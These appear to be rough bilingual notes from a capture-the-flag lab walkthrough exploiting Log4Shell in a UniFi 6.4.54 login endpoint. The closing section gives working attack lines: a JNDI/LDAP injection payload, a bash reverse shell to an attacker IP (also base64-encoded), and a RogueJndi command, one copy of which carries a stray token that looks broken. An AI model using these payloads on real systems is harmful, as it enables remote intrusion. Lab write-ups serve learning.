@@ -1,0 +1,77 @@
+WebVulnerability AssessmentDatabasesInjectionCustom ApplicationsOutdated SoftwareMongoDBJavaReconnaissanceClear Text CredentialsDefault CredentialsCode Injection   
+
+Empezamos con un nmap -sC -sV -v 10.129.89.100
+Tiene el puerto 8080 funcionando como proxy y nos redirecciona al puerto 8443. Para acceder al sitio web debemos poner el ip + :8443
+10.129.89.100:8443
+
+Upon accessing the page using a browser we are presented with the UniFi web portal login page and the
+version number is 6.4.54 . If we ever come across a version number it’s always a great idea to research that
+particular version on Google. A quick Google search using the keywords UniFy 6.4.54 exploit reveals an
+article that discusses the in-depth exploitation of the CVE-2021-44228 vulnerability within this application.
+
+This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection),
+which is a web security vulnerability that allows an attacker to execute arbitrary operating system
+commands on the server that is running the application and typically fully compromise the application and
+all its data.
+
+To determine if this is the case, we can use FoxyProxy after making a POST request to the /api/login
+endpoint, to pass on the request to BurpSuite, which will intercept it as a middle-man. The request can then
+be edited to inject commands. We provide a great module based around intercepting web requests.
+Intercepting Web Requests
+
+First, we attempt to login to the page with the credentials test:test as we aren’t trying to validate or gain
+access. The login request will be captured by BurpSuite and we will be able to modify it.
+Before we modify the request, let's send this HTTPS packet to the Repeater module of BurpSuite by
+pressing CTRL+R .
+
+Exploitation
+The Exploitation section of the previously mentioned article mentions that we have to input our payload into
+the remember parameter. Because the POST data is being sent as a JSON object and because the payload
+contains brackets {} , in order to prevent it from being parsed as another JSON object we enclose it inside
+brackets " so that it is parsed as a string instead.
+
+We input the payload into the remember field as shown above so that we can identify an injection point if
+one exists. If the request causes the server to connect back to us, then we have verified that the application
+is vulnerable.
+JNDI is the acronym for the Java Naming and Directory Interface API . By making calls to this API,
+applications locate resources and other program objects. A resource is a program object that provides
+connections to systems, such as database servers and messaging systems.
+LDAP is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,
+industry standard application protocol for accessing and maintaining distributed directory information
+services over the Internet or a Network. The default port that LDAP runs on is port 389 
+
+After we hit "send" the "Response" pane will display the response from the request. The output shows us an
+error message stating that the payload is invalid, but despite the error message the payload is actually being
+executed.
+Let's proceed to starting tcpdump on port 389 , which will monitor the network traffic for LDAP
+connections.
+Open up another terminal and type:
+The above syntax can be broken down as follows.
+After tcpdump has been started, click the Send button.
+tcpdump is a data-network packet analyzer computer program that runs under a command
+line interface. It allows the user to display TCP/IP and other packets being
+transmitted or received over a network to which the computer is attached.
+sudo tcpdump -i tun0 port 389
+sudo: Run this via root also known as admin.
+tcpdump: Is the program or software that is Wireshark except, it's a command line
+version.
+-i: Selecting interface. (Example eth0, wlan, tun0)
+port 389: Selecting the port we are listening on.
+
+${jndi:ldap://10.10.16.89/whatever}
+
+
+echo 'bash -c bash -i >&/dev/tcp/10.10.16.89/4444 0>&1' | base64 
+
+YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuODkvNDQ0NCAwPiYxCg==
+
+
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuODkvNDQ0NCAwPiYxCg==} | {base64,-d}|{bash,-i}" --hostname "10.10.16.89"
+
+
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuODkvNDQ0NCAwPiYxCg==} | {base64,-d}|{bash,-i}" --hostname "10.10.16.89"
+
+YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuODkvNDQ0NCAwPiYxCg==
+
+
+${jndi:ldap://10.10.15.81/whatever}
